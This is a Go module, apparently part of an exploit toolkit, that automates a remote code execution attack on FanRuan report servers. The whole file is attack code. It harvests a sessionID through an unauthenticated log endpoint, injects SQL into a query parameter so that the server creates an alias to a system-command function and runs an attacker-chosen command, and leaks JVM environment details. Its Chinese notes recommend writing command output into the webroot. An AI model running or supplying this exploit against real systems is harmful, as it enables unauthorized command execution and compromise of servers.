package exp_fanruan

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type Exp_RCE1 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_RCE1) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 未授权访问查询界面，获取sessionID
	queryUrl := self.AppendUri(self.Params.Target, "/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin")
	httpresp := self.HttpGetWithoutRedirect(queryUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	result := regexp.MustCompile(`op=fr_dialog&cmd=parameters_d&sessionID=(\d+)`).FindStringSubmatch(httpresp.Body)
	if len(result) == 0 {
		self.EchoErrMsg("无sessionID")
		return
	}
	sessionID := result[1]

	// payload发送
	payload := strings.ReplaceAll(`{"LABEL1":"TYPE:","TYPE":"10;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('{{cmd}}');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2022-04-24+00:00","LABEL5":"END_TIME:","END_TIME":"2022-04-24+16:00","LABEL7":"LIMIT:","LIMIT":1000}`, "{{cmd}}", cmd)
	payload = "__parameters__=" + url.QueryEscape(payload)

	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/ReportServer?"+result[0]), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("执行失败")
		return
	}

	// 刷新执行
	refreshUrl := self.AppendUri(self.Params.Target, fmt.Sprintf("/ReportServer?_=%d&__boxModel__=true&op=page_content&sessionID=%s&pn=1", time.Now().UnixMilli(), sessionID))
	httpresp = self.HttpGetWithoutRedirect(refreshUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("刷新失败")
		return
	}

	self.EchoInfoMsg("无回显，自行检查")
	return
}

func (self *Exp_RCE1) GetMsg1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 发送请求
	payload := `op=fr_base&cmd=evaluate_formula&expression=jvm()`
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/ReportServer"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	expResult.Result = strings.ReplaceAll(httpresp.Body, "\\n", "\r\n")
	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())
	expmsg := exp_model.ExpMsg{
		Time:     `2020-08-17`,
		Range:    ``,
		ID:       ``,
		Describe: `通过权限绕过，访问报表查询界面，获取到sessionid，发送查询，查询中TYPE/TIME参数存在注入，并能执行java代码，从而成功利用`,
		Details: `
输入URL不要带路径，跟应用的目录URI就行了。

利用是全自动化了，利用过程大致是，访问页面获取sessionid，携带sessionid发送查询，查询后，一定要刷新，才能成功执行代码。
应该无回显，推荐写文件回显如 cmd /c whoami > ../webroot/yyexam/2.txt
默认路径是在tomcat下

获取信息：获取环境变量，web路径
命令执行：无回显
`,
		Payload: ``,
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg:        expmsg,
		SubOptions: nil,
		AliasMap:   nil,
	}
	exp_register.ExpStructRegister(&Exp_RCE1{}, registerMsg)

}
